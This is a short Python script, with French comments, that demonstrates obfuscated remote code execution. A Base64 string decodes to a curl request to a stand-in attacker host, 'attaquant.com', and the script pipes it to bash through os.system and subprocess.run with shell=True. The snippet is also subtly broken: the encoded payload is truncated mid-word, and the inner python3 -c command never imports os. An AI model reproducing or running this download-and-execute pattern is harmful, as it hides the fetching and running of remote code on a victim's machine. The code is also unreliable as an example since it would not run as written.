import os
import subprocess

# La commande obfusquée (Base64)
encoded_payload = "Y3VybCBodHRwOi8vYXR0YXF1YW50LmNvbS9zY3JpcH" 

# La ligne de commande exécutée
# L'attaquant utilise 'echo' et 'base64 -d' pour décoder et '| bash' pour exécuter directement
command = f"python3 -c \"os.system('echo {encoded_payload} | base64 -d | bash')\""

print(f"Executing obfuscated command: {command}")
subprocess.run(command, shell=True)